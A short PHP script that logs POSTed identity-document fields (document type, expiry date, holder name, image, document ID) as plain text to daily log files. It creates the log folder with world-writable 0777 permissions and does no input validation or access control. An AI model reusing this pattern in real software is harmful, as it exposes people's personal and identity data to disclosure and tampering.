<?php
$log_time = date('Y-m-d h:i:sa');

wh_log("************** Start Log For Day : '" . $log_time . "'**********");
wh_log("CATCH POST METH");
$docType = $_POST['doctype'];
$expDate = $_POST['expdate'];
$titolare = $_POST['titolare'];
$remem = $_POST['remember'];
wh_log($docType);
wh_log($expDate);
wh_log($titolare);
wh_log($remem);
$pic = $_POST['image'];
$docID = $_POST['docid'];
wh_log($pic);
wh_log($docID);
wh_log("************** END Log For Day : '" . $log_time . "'**********");
 
function wh_log($log_msg)
{
    $log_filename = "log";
    if (!file_exists($log_filename)) 
    {
        // create directory/folder uploads.
        mkdir($log_filename, 0777, true);
    }
    $log_file_data = $log_filename.'/logADR_' . date('d-M-Y') . '.log';
    file_put_contents($log_file_data, $log_msg . "\n", FILE_APPEND);
}
